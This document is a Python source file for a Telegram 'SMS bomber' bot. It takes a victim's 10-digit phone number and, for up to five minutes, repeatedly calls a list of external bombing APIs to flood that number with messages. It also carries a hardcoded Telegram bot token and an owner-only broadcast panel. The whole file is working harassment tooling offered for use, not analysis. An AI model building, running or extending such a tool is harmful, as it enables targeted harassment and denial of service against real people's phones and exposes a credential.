
# ============================================================
# 🔥 ULTRA BOMBER BOT 🔥
# ============================================================
# ✅ Stop hote hi sirf "BOMBING STOPPED!" dikhega
# ✅ Results nahi dikhenge
# ✅ Baki sab features same
# ============================================================

from flask import Flask, request, jsonify
import requests
import json
import time
import threading
import os
import secrets

app = Flask(__name__)

# ====== CONFIG ======
BOT_TOKEN = "8643322725:AAFJtoQ6p3qupdVV8VxG6eQGtNMqWsw_eHw"
OWNER_ID = "8600328303"
MAX_BOMB_DURATION = 300
THREADS = 50
DELAY = 0.005

# ====== API DATABASE ======
API_DB = [
    {"name": "Part2_Bomber", "url": "https://brutal-bomber-part-2.onrender.com/bomb", "params": {"phone": "{phone}", "key": "shuvo"}},
    {"name": "Part1_Bomber", "url": "https://bomber-part-1.onrender.com/bomb", "params": {"phone": "{phone}", "key": "shuvo"}},
    {"name": "Ultra_Bomber", "url": "https://ultra-brutal-bomber.onrender.com/bomb", "params": {"phone": "{phone}"}},
    {"name": "Bomber_APIs_9ekv", "url": "https://bomber-apis-9ekv.onrender.com/bom", "params": {"key": "felix", "num": "{phone}"}},
    {"name": "Bomber_Pro", "url": "https://bomber-pro.onrender.com/bomb", "params": {"phone": "{phone}", "key": "shuvo", "cycles": "10"}},
    {"name": "Felix_XBOM", "url": "https://felix-xbom-wyt2.onrender.com/bom", "params": {"key": "demo", "num": "{phone}"}}
]

active_sessions = {}
user_bomb_start = {}
user_db = set()
user_states = {}

# ====== TELEGRAM FUNCTIONS ======
def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        return requests.post(url, json=payload, timeout=10).json()
    except:
        return None

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30, "allowed_updates": ["message", "callback_query"]}
    if offset:
        params["offset"] = offset
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json().get("result", [])
    except:
        return []

# ====== KEYBOARDS ======
def main_keyboard(chat_id):
    keyboard = [
        ["💀 Start Bombing", "🛑 Stop Bombing"],
        ["📡 APIs", "ℹ️ Help"]
    ]
    if str(chat_id) == OWNER_ID:
        keyboard.append(["👑 Admin Panel"])
    return {
        "keyboard": keyboard,
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def admin_keyboard():
    return {
        "keyboard": [
            ["📡 /apis", "➕ /setapi"],
            ["📢 Broadcast", "🔙 Back"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def stop_inline_keyboard(bomber_id):
    return {
        "inline_keyboard": [
            [{"text": "🛑 STOP BOMBING", "callback_data": f"stop_{bomber_id}"}]
        ]
    }

def api_list_inline(apis):
    keyboard = []
    for idx, api in enumerate(apis):
        keyboard.append([{"text": f"🗑️ {api['name']}", "callback_data": f"removeapi_{idx}"}])
    keyboard.append([{"text": "➕ Add API", "callback_data": "addapi"}])
    keyboard.append([{"text": "🔙 Back", "callback_data": "back_apis"}])
    return {"inline_keyboard": keyboard}

# ====== STYLE HELPERS ======
def bold(text): return f"<b>{text}</b>"
def quote(text): return f"<blockquote>{text}</blockquote>"
def code(text): return f"<code>{text}</code>"
def premium_emoji(): return "⭐️✨🔥💎⚡️🌟"

# ====== API FUNCTIONS ======
def parse_api_input(text):
    try:
        data = json.loads(text)
        if "name" in data and "url" in data:
            return data
    except:
        pass
    try:
        parts = text.split()
        api_dict = {}
        for part in parts:
            if "=" in part:
                key, value = part.split("=", 1)
                api_dict[key] = value
        if "name" in api_dict and "url" in api_dict:
            return api_dict
    except:
        pass
    return None

def add_api(api_data):
    if not api_data or "name" not in api_data or "url" not in api_data:
        return False, "Invalid API data"
    for api in API_DB:
        if api["name"] == api_data["name"]:
            return False, f"API {api_data['name']} already exists"
    API_DB.append(api_data)
    return True, f"API {api_data['name']} added"

def remove_api(index):
    if 0 <= index < len(API_DB):
        removed = API_DB.pop(index)
        return True, f"API {removed['name']} removed"
    return False, "Invalid API index"

# ====== BOMBER ENGINE ======
def send_bomb_request(api, phone):
    try:
        params = api["params"].copy()
        for k, v in params.items():
            if isinstance(v, str) and "{phone}" in v:
                params[k] = v.replace("{phone}", phone)
        response = requests.get(api["url"], params=params, timeout=10)
        return response.status_code in [200, 201, 202, 204]
    except:
        return False

def run_bombing(chat_id, phone, bomber_id):
    if chat_id in active_sessions and active_sessions[chat_id]["running"]:
        send_message(chat_id, "⚠️ Already running!", reply_markup=main_keyboard(chat_id))
        return
    
    active_sessions[chat_id] = {"running": True, "phone": phone}
    user_bomb_start[chat_id] = time.time()
    
    success, failed, cycle = 0, 0, 0
    start_time = time.time()
    
    send_message(chat_id,
        f"{bold('💀 BOMBING STARTED!')} {premium_emoji()}\n\n"
        f"📱 {bold('Target:')} {code(phone)}\n"
        f"📡 {bold('APIs:')} {len(API_DB)}\n"
        f"⚡ {bold('Threads:')} {THREADS}\n"
        f"⏱️  {bold('Delay:')} {DELAY}s\n"
        f"⏰ {bold('Max:')} 5 min",
        reply_markup=stop_inline_keyboard(bomber_id)
    )
    
    while active_sessions.get(chat_id, {}).get("running", False):
        if time.time() - user_bomb_start.get(chat_id, 0) > MAX_BOMB_DURATION:
            active_sessions[chat_id]["running"] = False
            send_message(chat_id, 
                f"{bold('⏰ TIME LIMIT REACHED!')} {premium_emoji()}\n\n"
                f"{quote('5-minute limit exceeded.')}",
                reply_markup=main_keyboard(chat_id)
            )
            break
        
        cycle += 1
        for api in API_DB * 3:
            if not active_sessions.get(chat_id, {}).get("running", False): break
            if send_bomb_request(api, phone): success += 1
            else: failed += 1
        
        if cycle % 10 == 0:
            remaining = int(MAX_BOMB_DURATION - (time.time() - user_bomb_start.get(chat_id, 0)))
            send_message(chat_id,
                f"{bold('📊 UPDATE')} {premium_emoji()}\n\n"
                f"✅ {bold('Success:')} {success}\n"
                f"❌ {bold('Failed:')} {failed}\n"
                f"⏰ {bold('Remaining:')} {remaining}s",
                reply_markup=stop_inline_keyboard(bomber_id)
            )
        time.sleep(DELAY)
    
    # ====== FIX: Stop hote hi sirf "BOMBING STOPPED!" ======
    if chat_id in active_sessions:
        # Send final message only if not already sent
        send_message(chat_id,
            f"{bold('✅ BOMBING STOPPED!')} {premium_emoji()}\n\n"
            f"{quote('Bombing session has been terminated.')}",
            reply_markup=main_keyboard(chat_id)
        )
        del active_sessions[chat_id]
    if chat_id in user_bomb_start:
        del user_bomb_start[chat_id]

# ====== COMMAND HANDLERS ======
def handle_start(chat_id):
    user_db.add(chat_id)
    send_message(chat_id,
        f"{bold('🔥 ULTRA BOMBER BOT 🔥')} {premium_emoji()}\n\n"
        f"{quote('The most brutal SMS bomber on Telegram!')}\n\n"
        f"📡 {bold('APIs:')} {len(API_DB)}\n"
        f"⚡ {bold('Threads:')} {THREADS}\n"
        f"⏱️  {bold('Delay:')} {DELAY}s\n"
        f"⏰ {bold('Max:')} 5 min\n"
        f"👑 {bold('Owner:')} {code(OWNER_ID)}",
        reply_markup=main_keyboard(chat_id)
    )

def handle_apis(chat_id):
    text = f"{bold('📡 ALL APIS')} {premium_emoji()}\n\n"
    for idx, api in enumerate(API_DB):
        text += f"{idx+1}. {bold(api['name'])}\n{code(api['url'])}\n\n"
    text += f"\n{bold('Total:')} {len(API_DB)} APIs"
    send_message(chat_id, text, api_list_inline(API_DB))

def handle_bomb(chat_id):
    user_states[chat_id] = "waiting_phone"
    send_message(chat_id,
        f"{bold('💀 START BOMBING')} {premium_emoji()}\n\n"
        f"{quote('Please enter the 10-digit phone number:')}\n\n"
        f"📝 {bold('Example:')} {code('9876543210')}",
        reply_markup=main_keyboard(chat_id)
    )

def handle_bomb_command(chat_id, phone):
    if len(phone) != 10 or not phone.isdigit():
        send_message(chat_id, f"{bold('❌ INVALID NUMBER!')}\n\n{quote('Please enter a valid 10-digit number.')}", reply_markup=main_keyboard(chat_id))
        return
    bomber_id = f"{chat_id}_{int(time.time())}"
    threading.Thread(target=run_bombing, args=(chat_id, phone, bomber_id)).start()

def handle_stop(chat_id):
    if chat_id in active_sessions and active_sessions[chat_id]["running"]:
        active_sessions[chat_id]["running"] = False
        # Stop button se bhi sirf "BOMBING STOPPED!" dikhega
        send_message(chat_id,
            f"{bold('✅ BOMBING STOPPED!')} {premium_emoji()}\n\n"
            f"{quote('Bombing session has been terminated.')}",
            reply_markup=main_keyboard(chat_id)
        )
    else:
        send_message(chat_id, f"{bold('❌ NO ACTIVE BOMBING!')}", reply_markup=main_keyboard(chat_id))

def handle_stop_callback(chat_id):
    if chat_id in active_sessions and active_sessions[chat_id]["running"]:
        active_sessions[chat_id]["running"] = False
        # Callback se bhi sirf "BOMBING STOPPED!" dikhega
        send_message(chat_id,
            f"{bold('✅ BOMBING STOPPED!')} {premium_emoji()}\n\n"
            f"{quote('Bombing session has been terminated.')}",
            reply_markup=main_keyboard(chat_id)
        )

def handle_admin_panel(chat_id):
    if str(chat_id) != OWNER_ID:
        send_message(chat_id, f"{bold('❌ ACCESS DENIED!')}", reply_markup=main_keyboard(chat_id))
        return
    send_message(chat_id,
        f"{bold('👑 ADMIN PANEL')} {premium_emoji()}\n\n"
        f"📡 {bold('APIs:')} {len(API_DB)}\n"
        f"👥 {bold('Users:')} {len(user_db)}",
        reply_markup=admin_keyboard()
    )

def handle_broadcast(chat_id):
    if str(chat_id) != OWNER_ID:
        send_message(chat_id, f"{bold('❌ ACCESS DENIED!')}", reply_markup=main_keyboard(chat_id))
        return
    user_states[chat_id] = "waiting_broadcast"
    send_message(chat_id,
        f"{bold('📢 BROADCAST')} {premium_emoji()}\n\n"
        f"{quote('Please enter your broadcast message:')}\n\n"
        f"📝 {bold('You can use:')}\n"
        f"• {bold('Bold')} — {code('<b>text</b>')}\n"
        f"• {bold('Quote')} — {code('<blockquote>text</blockquote>')}\n"
        f"• {bold('Code')} — {code('<code>text</code>')}\n"
        f"• {bold('Premium Emojis:')} {premium_emoji()}",
        reply_markup=admin_keyboard()
    )

def send_broadcast_message(chat_id, broadcast_text):
    if str(chat_id) != OWNER_ID:
        send_message(chat_id, f"{bold('❌ ACCESS DENIED!')}", reply_markup=main_keyboard(chat_id))
        return
    
    users = list(user_db)
    if not users:
        send_message(chat_id, f"{bold('📭 NO USERS!')}", reply_markup=admin_keyboard())
        return
    
    # Add premium emojis if not already
    if not any(emoji in broadcast_text for emoji in ["⭐️", "✨", "🔥", "💎", "⚡️", "🌟"]):
        broadcast_text = f"{premium_emoji()} {broadcast_text}"
    
    send_message(chat_id,
        f"{bold('📢 BROADCAST STARTED!')} {premium_emoji()}\n\n"
        f"👥 {bold('Users:')} {len(users)}\n"
        f"📝 {bold('Message:')}\n{quote(broadcast_text[:100])}...",
        reply_markup=admin_keyboard()
    )
    
    success, failed = 0, 0
    for chat in users:
        try:
            send_message(chat, broadcast_text)
            success += 1
        except:
            failed += 1
        time.sleep(0.1)
    
    send_message(chat_id,
        f"{bold('✅ BROADCAST COMPLETED!')} {premium_emoji()}\n\n"
        f"✅ {bold('Success:')} {success}\n"
        f"❌ {bold('Failed:')} {failed}",
        reply_markup=admin_keyboard()
    )

def handle_help(chat_id):
    send_message(chat_id,
        f"{bold('ℹ️ HELP')} {premium_emoji()}\n\n"
        f"💀 {bold('Start Bombing:')} Click the button\n"
        f"🛑 {bold('Stop Bombing:')} Click the button\n"
        f"📡 {bold('APIs:')} /apis\n"
        f"👑 {bold('Admin:')} /broadcast, /setapi",
        reply_markup=main_keyboard(chat_id)
    )

# ====== POLLING LOOP ======
def polling_loop():
    print("💀 Polling started...")
    last_update_id = 0
    
    while True:
        try:
            updates = get_updates(last_update_id + 1)
            
            for update in updates:
                last_update_id = update.get("update_id")
                
                if "callback_query" in update:
                    callback = update["callback_query"]
                    chat_id = str(callback["message"]["chat"]["id"])
                    data = callback["data"]
                    
                    if data.startswith("stop_"):
                        handle_stop_callback(chat_id)
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                                     json={"callback_query_id": callback["id"], "text": "🛑 Stopped!"})
                    
                    elif data.startswith("removeapi_"):
                        if str(chat_id) == OWNER_ID:
                            idx = int(data.replace("removeapi_", ""))
                            if remove_api(idx)[0]:
                                send_message(chat_id, "✅ API removed!", reply_markup=admin_keyboard())
                                handle_apis(chat_id)
                    
                    elif data == "addapi":
                        if str(chat_id) == OWNER_ID:
                            send_message(chat_id, "➕ Send: name=MyAPI url=https://api.com", reply_markup=admin_keyboard())
                    
                    elif data == "back_apis":
                        handle_apis(chat_id)
                    
                    continue
                
                if "message" not in update:
                    continue
                
                message = update["message"]
                chat_id = str(message["chat"]["id"])
                text = message.get("text", "").strip()
                
                user_db.add(chat_id)
                
                # Check if user is waiting for input
                if chat_id in user_states:
                    if user_states[chat_id] == "waiting_phone":
                        del user_states[chat_id]
                        handle_bomb_command(chat_id, text)
                        continue
                    elif user_states[chat_id] == "waiting_broadcast":
                        del user_states[chat_id]
                        send_broadcast_message(chat_id, text)
                        continue
                
                if text == "/start":
                    handle_start(chat_id)
                elif text in ["💀 Start Bombing", "/bomb"]:
                    handle_bomb(chat_id)
                elif text.startswith("/bomb "):
                    handle_bomb_command(chat_id, text.replace("/bomb ", "").strip())
                elif text in ["🛑 Stop Bombing", "/stop"]:
                    handle_stop(chat_id)
                elif text in ["📡 APIs", "/apis"]:
                    handle_apis(chat_id)
                elif text in ["➕ /setapi"] or text.startswith("/setapi"):
                    if str(chat_id) == OWNER_ID:
                        if len(text.split()) > 1:
                            api_data = parse_api_input(text)
                            if api_data:
                                success, msg = add_api(api_data)
                                send_message(chat_id, f"{'✅' if success else '❌'} {msg}", reply_markup=admin_keyboard())
                            else:
                                send_message(chat_id, "❌ Invalid format!\nUse: name=MyAPI url=https://api.com", reply_markup=admin_keyboard())
                        else:
                            send_message(chat_id, "➕ Send: name=MyAPI url=https://api.com", reply_markup=admin_keyboard())
                    else:
                        send_message(chat_id, "❌ Access Denied!")
                elif text == "👑 Admin Panel":
                    handle_admin_panel(chat_id)
                elif text == "📢 Broadcast":
                    handle_broadcast(chat_id)
                elif text == "🔙 Back":
                    send_message(chat_id, "✅ Back!", reply_markup=main_keyboard(chat_id))
                elif text.startswith("/broadcast"):
                    if str(chat_id) == OWNER_ID:
                        parts = text.split(maxsplit=1)
                        if len(parts) > 1:
                            send_broadcast_message(chat_id, parts[1])
                        else:
                            handle_broadcast(chat_id)
                    else:
                        send_message(chat_id, "❌ Access Denied!")
                elif text in ["ℹ️ Help", "/help"]:
                    handle_help(chat_id)
                else:
                    send_message(chat_id, "❌ Unknown\nUse /start", reply_markup=main_keyboard(chat_id))
            
            time.sleep(1)
            
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(5)

# ====== FLASK ENDPOINTS ======
@app.route('/')
def home():
    return {"status": "🔥 ULTRA BOMBER BOT 🔥", "owner": OWNER_ID, "apis": len(API_DB), "users": len(user_db)}

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "bot": "Ultra Bomber Bot", "apis": len(API_DB), "users": len(user_db)})

# ====== START ======
if __name__ == "__main__":
    print("🔥 ULTRA BOMBER BOT STARTED!")
    print(f"📡 APIs: {len(API_DB)}")
    print(f"👑 Owner: {OWNER_ID}")
    
    threading.Thread(target=polling_loop, daemon=True).start()
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
